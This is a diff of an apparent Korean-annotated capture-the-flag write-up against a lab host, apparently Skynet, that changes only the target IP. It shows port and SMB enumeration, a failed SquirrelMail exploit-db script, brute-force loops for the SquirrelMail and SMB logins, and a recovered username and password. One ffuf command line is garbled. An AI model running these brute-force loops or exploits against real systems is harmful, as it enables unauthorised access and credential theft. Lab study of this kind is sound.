@@ -1,10 +1,10 @@
-## 10.48.183.145
+## 10.48.172.131
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/448e522f-cf65-4bc4-89a5-ef80eb7bcc50/image.png)
 
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo docker run --rm --name rustscan --net=host rustscan/rustscan -a 10.48.183.145
+└─$ sudo docker run --rm --name rustscan --net=host rustscan/rustscan -a 10.48.172.131
 Unable to find image 'rustscan/rustscan:latest' locally
 latest: Pulling from rustscan/rustscan
 582df0bcf6ab: Pull complete 
@@ -26,30 +26,30 @@ To scan or not to scan? That is the question.
 [~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
-Open 10.48.183.145:22
-Open 10.48.183.145:80
-Open 10.48.183.145:110
-Open 10.48.183.145:143
-Open 10.48.183.145:139
-Open 10.48.183.145:445
+Open 10.48.172.131:22
+Open 10.48.172.131:80
+Open 10.48.172.131:110
+Open 10.48.172.131:143
+Open 10.48.172.131:139
+Open 10.48.172.131:445
 [~] Starting Script(s)
 [~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 07:26 UTC
 Initiating Ping Scan at 07:26
-Scanning 10.48.183.145 [2 ports]
+Scanning 10.48.172.131 [2 ports]
 Completed Ping Scan at 07:26, 0.20s elapsed (1 total hosts)
 Initiating Parallel DNS resolution of 1 host. at 07:26
 Completed Parallel DNS resolution of 1 host. at 07:26, 0.01s elapsed
 DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
 Initiating Connect Scan at 07:26
-Scanning 10.48.183.145 [6 ports]
-Discovered open port 110/tcp on 10.48.183.145
-Discovered open port 80/tcp on 10.48.183.145
-Discovered open port 143/tcp on 10.48.183.145
-Discovered open port 22/tcp on 10.48.183.145
-Discovered open port 445/tcp on 10.48.183.145
-Discovered open port 139/tcp on 10.48.183.145
+Scanning 10.48.172.131 [6 ports]
+Discovered open port 110/tcp on 10.48.172.131
+Discovered open port 80/tcp on 10.48.172.131
+Discovered open port 143/tcp on 10.48.172.131
+Discovered open port 22/tcp on 10.48.172.131
+Discovered open port 445/tcp on 10.48.172.131
+Discovered open port 139/tcp on 10.48.172.131
 Completed Connect Scan at 07:26, 0.20s elapsed (6 total ports)
-Nmap scan report for 10.48.183.145
+Nmap scan report for 10.48.172.131
 Host is up, received syn-ack (0.20s latency).
 Scanned at 2025-11-30 07:26:47 UTC for 0s
 
@@ -68,7 +68,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 
 
 ──(kali㉿kali)-[~]
-└─$ http http://10.48.183.145                    
+└─$ http http://10.48.172.131                    
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
 Connection: Keep-Alive
@@ -105,10 +105,10 @@ Vary: Accept-Encoding
 
 > path
 
-ffuf -u http://10.48.183.145/FUZZ -w /usr/share/wordlists/seclists/Dicovery/Web-Content/common.txt
+ffuf -u http://10.48.172.131/FUZZ -w /usr/share/wordlists/seclists/Dicovery/Web-Content/common.txt
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo ffuf -u http://10.48.183.145/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+└─$ sudo ffuf -u http://10.48.172.131/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -121,7 +121,7 @@ ffuf -u http://10.48.183.145/FUZZ -w /usr/share/wordlists/seclists/Dicovery/Web-
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://10.48.183.145/FUZZ
+ :: URL              : http://10.48.172.131/FUZZ
  :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
  :: Follow redirects : false
  :: Calibration      : false
@@ -145,7 +145,7 @@ squirrelmail            [Status: 301, Size: 319, Words: 20, Lines: 10, Duration:
 > /admin
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo http http://10.48.183.145/admin/
+└─$ sudo http http://10.48.172.131/admin/
 HTTP/1.1 403 Forbidden
 Connection: Keep-Alive
 Content-Length: 277
@@ -161,21 +161,21 @@ Server: Apache/2.4.18 (Ubuntu)
 <h1>Forbidden</h1>
 <p>You don't have permission to access this resource.</p>
 <hr>
-<address>Apache/2.4.18 (Ubuntu) Server at 10.48.183.145 Port 80</address>
+<address>Apache/2.4.18 (Ubuntu) Server at 10.48.172.131 Port 80</address>
 </body></html>
 
 
 > squirrelmail
                                                                                                                           
 ┌──(kali㉿kali)-[~]
-└─$ sudo http http://10.48.183.145/squirrelmail
+└─$ sudo http http://10.48.172.131/squirrelmail
 HTTP/1.1 301 Moved Permanently
 Connection: Keep-Alive
 Content-Length: 319
 Content-Type: text/html; charset=iso-8859-1
 Date: Sun, 30 Nov 2025 07:43:34 GMT
 Keep-Alive: timeout=5, max=100
-Location: http://10.48.183.145/squirrelmail/
+Location: http://10.48.172.131/squirrelmail/
 Server: Apache/2.4.18 (Ubuntu)
 
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
@@ -183,9 +183,9 @@ Server: Apache/2.4.18 (Ubuntu)
 <title>301 Moved Permanently</title>
 </head><body>
 <h1>Moved Permanently</h1>
-<p>The document has moved <a href="http://10.48.183.145/squirrelmail/">here</a>.</p>
+<p>The document has moved <a href="http://10.48.172.131/squirrelmail/">here</a>.</p>
 <hr>
-<address>Apache/2.4.18 (Ubuntu) Server at 10.48.183.145 Port 80</address>
+<address>Apache/2.4.18 (Ubuntu) Server at 10.48.172.131 Port 80</address>
 </body></html>
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/7ffe0334-e834-4649-9191-1e219af9be1b/image.png)
@@ -193,7 +193,7 @@ Server: Apache/2.4.18 (Ubuntu)
 
 ```html
 ┌──(kali㉿kali)-[~]
-└─$ curl -L http://10.48.183.145/squirrelmail
+└─$ curl -L http://10.48.172.131/squirrelmail
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 
 <html>
@@ -516,7 +516,7 @@ echo -e "\n[*] All done. Exiting"
 ```bash
 
 ┌──(kali㉿kali)-[~]
-└─$ sudosudo ffuf -up://10.48.183.145 -H "-H "Host: FUZZ.10.48.183.145" -osts.txt -w /-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+└─$ sudosudo ffuf -up://10.48.172.131 -H "-H "Host: FUZZ.10.48.172.131" -osts.txt -w /-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 
 
         /'___\  /'___\           /'___\       
@@ -530,9 +530,9 @@ echo -e "\n[*] All done. Exiting"
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://10.48.183.145
+ :: URL              : http://10.48.172.131
  :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
- :: Header           : Host: FUZZ.10.48.183.145
+ :: Header           : Host: FUZZ.10.48.172.131
  :: Output file      : vhosts.txt
  :: File format      : json
  :: Follow redirects : false
@@ -579,7 +579,7 @@ Example:
 
                                                                                                                               
 ┌──(kali㉿kali)-[~]
-└─$ sudo /usr/share/exploitdb/exploits/linux/remote/41910.sh http://10.48.183.145/squireelmail/
+└─$ sudo /usr/share/exploitdb/exploits/linux/remote/41910.sh http://10.48.172.131/squireelmail/
 
      __                     __   __  __           __
     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
@@ -606,7 +606,7 @@ https://ExploitBox.io
 user: 
 pass: 
 
-[*] Logging in to SquirrelMail at http://10.48.183.145/squireelmail/
+[*] Logging in to SquirrelMail at http://10.48.172.131/squireelmail/
 
 
 [*] Uploading Sendmail config
@@ -621,8 +621,8 @@ Something went wrong. Failed to upload the sendmail file.
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ cat scan.txt          
-Nmap 7.95 scan initiated Sun Nov 30 18:14:34 2025 as: /usr/lib/nmap/nmap -sS -sC -sV -O -Pn -oN scan.txt --open -p 22,80,110,139,143,445 10.48.183.145
-Nmap scan report for 10.48.183.145
+Nmap 7.95 scan initiated Sun Nov 30 18:14:34 2025 as: /usr/lib/nmap/nmap -sS -sC -sV -O -Pn -oN scan.txt --open -p 22,80,110,139,143,445 10.48.172.131
+Nmap scan report for 10.48.172.131
 Host is up (0.20s latency).
 
 PORT    STATE SERVICE     VERSION
@@ -678,7 +678,7 @@ OS and Service detection performed. Please report any incorrect results at https
 ```bash
 # enum4linux
 ┌──(kali㉿kali)-[~]
-└─$ enum4linux -a 10.48.183.145
+└─$ enum4linux -a 10.48.172.131
 perl: warning: Setting locale failed.
 perl: warning: Please check that your locale settings:
         LANGUAGE = "",
@@ -702,22 +702,22 @@ Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux
 
  =========================================( Target Information )=========================================
                                                                                                                               
-Target ........... 10.48.183.145                                                                                              
+Target ........... 10.48.172.131                                                                                              
 RID Range ........ 500-550,1000-1050
 Username ......... ''
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
 
- ===========================( Enumerating Workgroup/Domain on 10.48.183.145 )===========================
+ ===========================( Enumerating Workgroup/Domain on 10.48.172.131 )===========================
                                                                                                                               
                                                                                                                               
 [+] Got domain/workgroup name: WORKGROUP                                                                                      
                                                                                                                               
                                                                                                                               
- ===============================( Nbtstat Information for 10.48.183.145 )===============================
+ ===============================( Nbtstat Information for 10.48.172.131 )===============================
                                                                                                                               
-Looking up status of 10.48.183.145                                                                                            
+Looking up status of 10.48.172.131                                                                                            
         SKYNET          <00> -         B <ACTIVE>  Workstation Service
         SKYNET          <03> -         B <ACTIVE>  Messenger Service
         SKYNET          <20> -         B <ACTIVE>  File Server Service
@@ -728,13 +728,13 @@ Looking up status of 10.48.183.145
 
         MAC Address = 00-00-00-00-00-00
 
- ===================================( Session Check on 10.48.183.145 )===================================
+ ===================================( Session Check on 10.48.172.131 )===================================
                                                                                                                               
                                                                                                                               
-[+] Server 10.48.183.145 allows sessions using username '', password ''                                                       
+[+] Server 10.48.172.131 allows sessions using username '', password ''                                                       
                                                                                                                               
                                                                                                                               
- ================================( Getting domain SID for 10.48.183.145 )================================
+ ================================( Getting domain SID for 10.48.172.131 )================================
                                                                                                                               
 Domain Name: WORKGROUP                                                                                                        
 Domain Sid: (NULL SID)
@@ -742,26 +742,26 @@ Domain Sid: (NULL SID)
 [+] Can't determine if host is part of domain or part of a workgroup                                                          
                                                                                                                               
                                                                                                                               
- ==================================( OS information on 10.48.183.145 )==================================
+ ==================================( OS information on 10.48.172.131 )==================================
                                                                                                                               
                                                                                                                               
 [E] Can't get OS info with smbclient                                                                                          
                                                                                                                               
                                                                                                                               
-[+] Got OS info for 10.48.183.145 from srvinfo:                                                                               
+[+] Got OS info for 10.48.172.131 from srvinfo:                                                                               
         SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)                                                     
         platform_id     :       500
         os version      :       6.1
         server type     :       0x809a03
 
 
- =======================================( Users on 10.48.183.145 )=======================================
+ =======================================( Users on 10.48.172.131 )=======================================
                                                                                                                               
 index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc:                                                 
 
 user:[milesdyson] rid:[0x3e8]
 
- =================================( Share Enumeration on 10.48.183.145 )=================================
+ =================================( Share Enumeration on 10.48.172.131 )=================================
                                                                                                                               
                                                                                                                               
         Sharename       Type      Comment
@@ -779,23 +779,23 @@ Reconnecting with SMB1 for workgroup listing.
         ---------            -------
         WORKGROUP            SKYNET
 
-[+] Attempting to map shares on 10.48.183.145                                                                                 
+[+] Attempting to map shares on 10.48.172.131                                                                                 
                                                                                                                               
-//10.48.183.145/print$  Mapping: DENIED Listing: N/A Writing: N/A                                                             
-//10.48.183.145/anonymous       Mapping: OK Listing: OK Writing: N/A
-//10.48.183.145/milesdyson      Mapping: DENIED Listing: N/A Writing: N/A
+//10.48.172.131/print$  Mapping: DENIED Listing: N/A Writing: N/A                                                             
+//10.48.172.131/anonymous       Mapping: OK Listing: OK Writing: N/A
+//10.48.172.131/milesdyson      Mapping: DENIED Listing: N/A Writing: N/A
 
 [E] Can't understand response:                                                                                                
                                                                                                                               
 NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                    
-//10.48.183.145/IPC$    Mapping: N/A Listing: N/A Writing: N/A
+//10.48.172.131/IPC$    Mapping: N/A Listing: N/A Writing: N/A
 
- ===========================( Password Policy Information for 10.48.183.145 )===========================
+ ===========================( Password Policy Information for 10.48.172.131 )===========================
                                                                                                                               
 Password:                                                                                                                     
 
 
-[+] Attaching to 10.48.183.145 using a NULL share
+[+] Attaching to 10.48.172.131 using a NULL share
 
 [+] Trying protocol 139/SMB...
 
@@ -833,7 +833,7 @@ Password Complexity: Disabled
 Minimum Password Length: 5
 
 
- ======================================( Groups on 10.48.183.145 )======================================
+ ======================================( Groups on 10.48.172.131 )======================================
                                                                                                                               
                                                                                                                               
 [+] Getting builtin groups:                                                                                                   
@@ -854,7 +854,7 @@ Minimum Password Length: 5
 [+]  Getting domain group memberships:                                                                                        
                                                                                                                               
                                                                                                                               
- ==================( Users on 10.48.183.145 via RID cycling (RIDS: 500-550,1000-1050) )==================
+ ==================( Users on 10.48.172.131 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                               
                                                                                                                               
 [I] Found new SID:                                                                                                            
@@ -892,7 +892,7 @@ S-1-5-32-550 BUILTIN\Print Operators (Local Group)
                                                                                                                               
 ^TS-1-22-1-1001 Unix User\milesdyson (Local User)                                                                             
 
- ===============================( Getting printer info for 10.48.183.145 )===============================
+ ===============================( Getting printer info for 10.48.172.131 )===============================
                                                                                                                               
 No printers returned.                                                                                                         
 
@@ -909,7 +909,7 @@ enum4linux complete on Sun Nov 30 18:37:47 2025
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ sudo smbmap -H 10.48.183.145
+└─$ sudo smbmap -H 10.48.172.131
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -925,7 +925,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [\] Checking for open ports...                                                                                                [|] Checking for open ports...                                                                                                [/] Checking for open ports...                                                                                                [-] Checking for open ports...                                                                                                [\] Checking for open ports...                                                                                                [*] Detected 1 hosts serving SMB
 [*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                              
-[+] IP: 10.48.183.145:445       Name: 10.48.183.145             Status: NULL Session
+[+] IP: 10.48.172.131:445       Name: 10.48.172.131             Status: NULL Session
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         print$                                                  NO ACCESS       Printer Drivers
@@ -936,7 +936,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                              
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo smbmap -H 10.48.183.145 -u anonymous 
+└─$ sudo smbmap -H 10.48.172.131 -u anonymous 
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -952,7 +952,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [\] Checking for open ports...                                                                                                [|] Checking for open ports...                                                                                                [/] Checking for open ports...                                                                                                [-] Checking for open ports...                                                                                                [\] Checking for open ports...                                                                                                [|] Checking for open ports...                                                                                                [*] Detected 1 hosts serving SMB
 [*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                              
-[+] IP: 10.48.183.145:445       Name: 10.48.183.145             Status: NULL Session
+[+] IP: 10.48.172.131:445       Name: 10.48.172.131             Status: NULL Session
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         print$                                                  NO ACCESS       Printer Drivers
@@ -965,7 +965,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 # 공유 폴더 지정해서 검색
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo smbmap -H 10.48.183.145 -u anonymous -s anonymous -r '' --depth 5
+└─$ sudo smbmap -H 10.48.172.131 -u anonymous -s anonymous -r '' --depth 5
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -981,7 +981,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [\] Checking for open ports...                                                                                                [|] Checking for open ports...                                                                                                [/] Checking for open ports...                                                                                                [-] Checking for open ports...                                                                                                [\] Checking for open ports...                                                                                                [|] Checking for open ports...                                                                                                [*] Detected 1 hosts serving SMB
 [*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                              
-[+] IP: 10.48.183.145:445       Name: 10.48.183.145             Status: NULL Session
+[+] IP: 10.48.172.131:445       Name: 10.48.172.131             Status: NULL Session
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         print$                                                  NO ACCESS       Printer Drivers
@@ -1005,7 +1005,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 # attention, log 1~3 파일 다운로드
 
 ┌──(kali㉿kali)-[~]
-└─$ sudo smbmap -H 10.48.183.145 -u anonymous --download 'anonymous/attention.txt'
+└─$ sudo smbmap -H 10.48.172.131 -u anonymous --download 'anonymous/attention.txt'
 
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -1021,7 +1021,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [\] Checking for open ports...                                                                                                [|] Checking for open ports...                                                                                                [/] Checking for open ports...                                                                                                [-] Checking for open ports...                                                                                                [\] Checking for open ports...                                                                                                [*] Detected 1 hosts serving SMB
 [*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
 [+] Starting download: anonymous\attention.txt (163 bytes)                                                               
-[+] File output to: /home/kali/10.48.183.145-anonymous_attention.txt                                                     
+[+] File output to: /home/kali/10.48.172.131-anonymous_attention.txt                                                     
 [*] Closed 1 connections  
 
 ```
@@ -1030,29 +1030,29 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 
 ┌──(kali㉿kali)-[~]
 └─$ ls
-10.48.183.145-anonymous_attention.txt  Documents  Music     Public     Videos      scan.txt  vpn.ovpn
+10.48.172.131-anonymous_attention.txt  Documents  Music     Public     Videos      scan.txt  vpn.ovpn
 Desktop                                Downloads  Pictures  Templates  linpeas.sh  snap      workspace
                                                                                                                               
 ┌──(kali㉿kali)-[~]
-└─$ cat 10.48.183.145-anonymous_attention.txt 
+└─$ cat 10.48.172.131-anonymous_attention.txt 
 A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
 -Miles Dyson
 
-sudo smbmap -H 10.48.183.145 -u anonymous --download 'anonymous/logs/log1.txt'
-sudo smbmap -H 10.48.183.145 -u anonymous --download 'anonymous/logs/log2.txt'
-sudo smbmap -H 10.48.183.145 -u anonymous --download 'anonymous/logs/log3.txt'
+sudo smbmap -H 10.48.172.131 -u anonymous --download 'anonymous/logs/log1.txt'
+sudo smbmap -H 10.48.172.131 -u anonymous --download 'anonymous/logs/log2.txt'
+sudo smbmap -H 10.48.172.131 -u anonymous --download 'anonymous/logs/log3.txt'
 
 
 > logs -> passwordlists? or usernames?
                                                                                                                              
 ┌──(kali㉿kali)-[~]
-└─$ cat 10.48.183.145-anonymous_logs_log2.txt 
+└─$ cat 10.48.172.131-anonymous_logs_log2.txt 
                                                                                                                               
 ┌──(kali㉿kali)-[~]
-└─$ cat 10.48.183.145-anonymous_logs_log3.txt 
+└─$ cat 10.48.172.131-anonymous_logs_log3.txt 
                                                                                                                               
 ┌──(kali㉿kali)-[~]
-└─$ cat 10.48.183.145-anonymous_logs_log1.txt 
+└─$ cat 10.48.172.131-anonymous_logs_log1.txt 
 cyborg007haloterminator
 terminator22596
 terminator219
@@ -1089,7 +1089,7 @@ Walterminator
 > milesdyson/Miles Dyson
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ enum4linux -a 10.48.183.145 -U milesdyson
+└─$ enum4linux -a 10.48.172.131 -U milesdyson
 
 [+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                   
                                                                                                                               
@@ -1104,7 +1104,7 @@ S-1-5-32-550 BUILTIN\Print Operators (Local Group)
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                   
                                                                                                                               
 S-1-22-1-1001 Unix User\milesdyson (Local User)                                                                               
-ports=$(nmap -p 139,445 10.48.183.145 --open -oG - | grep "/open" | cut -d" " -f2)
+ports=$(nmap -p 139,445 10.48.172.131 --open -oG - | grep "/open" | cut -d" " -f2)
                                                                                                                               
 
 [+] Enumerating users using SID S-1-5-21-2393614426-3774336851-1116533619 and logon username '', password ''                  
@@ -1117,31 +1117,31 @@ S-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\milesdyson (Local User)
 
 ```bash
 # nmap으로 열린 SMB 포트 확인 후 SMBMap 실행
-ports=$(nmap -p 139,445 10.48.183.145 --open -oG - | grep "/open" | cut -d" " -f2)
+ports=$(nmap -p 139,445 10.48.172.131 --open -oG - | grep "/open" | cut -d" " -f2)
 for ip in $ports; do smbmap -H $ip; done
 
 # 사용자 목록과 패스워드 목록으로 SMB 접속 시도
-for u in $(cat users.txt); do for p in $(cat pass.txt); do echo "Testing $u:$p"; smbmap -u "$u" -p "$p" -H 10.48.183.145; done; done
+for u in $(cat users.txt); do for p in $(cat pass.txt); do echo "Testing $u:$p"; smbmap -u "$u" -p "$p" -H 10.48.172.131; done; done
 ```
 
 
 
-> http://10.48.183.145/squirrelmail/src/login.php 로그인 시도하기
+> http://10.48.172.131/squirrelmail/src/login.php 로그인 시도하기
 > username=milesdyson
 > password=log1.txt
 > burpsuite -> intruder
 ```
 POST /squirrelmail/src/redirect.php HTTP/1.1
-Host: 10.48.183.145
+Host: 10.48.172.131
 Content-Length: 81
 Cache-Control: max-age=0
 Accept-Language: en-US,en;q=0.9
-Origin: http://10.48.183.145
+Origin: http://10.48.172.131
 Content-Type: application/x-www-form-urlencoded
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://10.48.183.145/squirrelmail/src/login.php
+Referer: http://10.48.172.131/squirrelmail/src/login.php
 Accept-Encoding: gzip, deflate, br
 Cookie: SQMSESSID=84i2hdlhrmmdbn3hnf7lc3h9v3
 Connection: keep-alive
@@ -1170,7 +1170,7 @@ FAILURE_STRING="로그인 실패 시 나오는 고유한 문자열"
 # ---------------------------------------------------------------
 
 echo "--- SquirrelMail Brute-Force Test Started ---"
-echo "Target: http://10.48.183.145/squirrelmail/src/redirect.php"
+echo "Target: http://10.48.172.131/squirrelmail/src/redirect.php"
 echo "-----------------------------------------------"
 
 for u in $(cat $USER_FILE); do
@@ -1183,7 +1183,7 @@ for u in $(cat $USER_FILE); do
     # -s: Silent 모드 (진행률 표시 숨김)
     # -d: POST 데이터 전송 (application/x-www-form-urlencoded)
     # -q: grep 쿼리 옵션 (출력 없이 상태 코드만 반환)
-    curl -s -X POST "http://10.48.183.145/squirrelmail/src/redirect.php" \
+    curl -s -X POST "http://10.48.172.131/squirrelmail/src/redirect.php" \
       -d "login_username=$u&secretkey=$p&js_autodetect_results=1&just_logged_in=1" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       | grep -q "$FAILURE_STRING"
@@ -1266,7 +1266,7 @@ body {
 > milesdyson/terminator22596
 
 ┌──(kali㉿kali)-[~]
-└─$ smbclient //10.48.183.145/anonymous -N
+└─$ smbclient //10.48.172.131/anonymous -N
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Fri Nov 27 01:04:00 2020
@@ -1285,7 +1285,7 @@ smbclient //<TARGET_IP>/<SHARE_NAME> -U <USERNAME>
 ```bash
 # 재시도 실패
 # 사용자 목록과 패스워드 목록으로 SMB 접속 시도
-for u in $(cat users.txt); do for p in $(cat pass.txt); do echo "Testing $u:$p"; smbmap -u "$u" -p "$p" -H 10.48.183.145; done; done
+for u in $(cat users.txt); do for p in $(cat pass.txt); do echo "Testing $u:$p"; smbmap -u "$u" -p "$p" -H 10.48.172.131; done; done
 ```
 
 
